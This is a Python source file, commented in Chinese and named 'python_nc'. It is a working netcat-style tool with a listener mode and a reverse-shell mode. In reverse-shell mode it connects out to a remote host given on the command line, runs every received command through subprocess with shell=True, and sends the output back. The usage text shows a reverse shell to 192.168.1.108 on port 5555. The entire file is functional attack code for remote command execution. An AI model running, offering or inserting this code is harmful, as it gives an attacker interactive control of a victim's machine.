import os
import socket
import argparse
import struct
import subprocess
import textwrap


def exec_cmd(command, code_flag):
    """执行命令函数"""
    command = command.decode("utf-8")
    # 1.处理cd命令
    if command[:2] == "cd" and len(command) > 2:
        try:
            os.chdir(command[3:])
            # 返回当前切换到的路径
            cmd_path = os.getcwd()
            stdout_res = f"切换到 {cmd_path} 路径下"
        except Exception:
            stdout_res = f"系统找不到指定的路径。: {command[3:]}"
    else:
        obj = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)  # 没有一个结束时间  vim 会一直卡在这一行
        stdout_res = obj.stdout.read() + obj.stderr.read()
        # 2.处理无回显命令
        if not stdout_res:
            stdout_res = f"{command} 执行成功"
        else:
            try:
                # cmd执行系统命令的编码
                stdout_res = stdout_res.decode(code_flag)
            except Exception:
                # 如果是打印 utf-8 编码保存的文件
                if code_flag == "gbk":
                    code_flag = "utf-8"
                elif code_flag == "utf-8":
                    code_flag = "gbk"
                stdout_res = stdout_res.decode(code_flag)
    return stdout_res.strip()


def recv_data(sock, buf_size=1024):
    """解决粘包"""
    # 先接受命令执行结果的长度
    x = sock.recv(4)
    all_size = struct.unpack('i', x)[0]
    # 接收真实数据
    recv_size = 0
    data = b''
    while recv_size < all_size:
        data += sock.recv(buf_size)
        recv_size += buf_size
    return data


def send_data(sock, data):
    """发送数据也解决粘包问题"""
    if not data: return
    if type(data) == str:
        data = data.encode("utf-8")
    # 新增发送命令的粘包解决方案
    # 计算命令长度 , 打包发送
    cmd_len = struct.pack('i', len(data))
    sock.send(cmd_len)
    # 发送命令
    sock.send(data)


def listen(arg, sock):
    # 监听的逻辑
    # 1.监听sock
    lport = arg.port
    sock.bind(("0.0.0.0", lport))
    sock.listen(1)
    conn, addr = sock.accept()
    while 1:
        try:
            cmd = input(f"{addr}>").strip()
            if not cmd: continue
            # 3.发送命令
            send_data(conn, cmd)
            # 退出监听
            if cmd.lower() == "quit":
                conn.close()
                return
            # 4.接收结果输出
            res = recv_data(conn)
            print(res.decode("utf-8"))
        except KeyboardInterrupt:
            continue


def reverse_shell(arg, sock):
    # 反弹shell的逻辑
    # 1.链接指定目标
    rhost = arg.rhost
    rport = arg.port
    sock.connect((rhost, rport))
    # 2.循环接收对方发送的命令
    code_flag = "gbk" if os.name == "nt" else "utf-8"
    while 1:
        data = recv_data(sock)
        # 收到退出信号
        if data == b'quit':
            break
        # 3.执行发送结果过去
        res = exec_cmd(data, code_flag)
        send_data(sock, res)


def main(arg):
    # 判断当前程序进入的分支是监听还是反弹
    # 不管你是监听还是反弹都是要创建socket对象的
    # socket.setdefaulttimeout(10)
    sock = socket.socket()
    if arg.rhost:
        # 反弹shell
        reverse_shell(arg, sock)
    else:
        # 监听本地
        listen(arg, sock)
    sock.close()


if __name__ == '__main__':
    # 命令行编程 , 接收参数
    parser = argparse.ArgumentParser(description='python_nc', formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
       nc1.0.py -p 5555 # listen port
       nc1.0.py -r 192.168.1.108 -p 5555 # reverse a shell
       '''))
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-r', '--rhost', type=str, help='remote host')
    arg = parser.parse_args()

    main(arg)
